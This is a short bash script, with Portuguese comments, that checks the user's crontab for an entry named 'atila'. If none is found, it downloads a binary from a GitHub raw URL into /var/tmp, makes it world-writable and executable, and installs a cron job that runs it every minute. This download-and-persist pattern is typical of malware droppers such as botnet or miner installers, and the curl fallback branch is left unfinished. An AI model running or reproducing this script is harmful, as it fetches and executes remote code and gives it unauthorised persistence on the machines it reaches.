#ATILA_VKZMN


#esse script executara varias acoes   elas serao inplemetadas  

#nem todas agora ok so as mais importantes por agora ok


url='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'


cron_out=$( crontab -l )


if  echo  "$cron_out" | grep -q atila  ; then 

echo tem

else

echo nao tem 

#download of atila and add in crontab 

command -v wget

if (( $? )) ; then 

curl 

else 

wget  $url -O /var/tmp/atila

cd /var/tmp ; chmod 777 atila



(crontab -l ; echo "* * * * * /var/tmp/atila") | crontab -




fi;


fi;










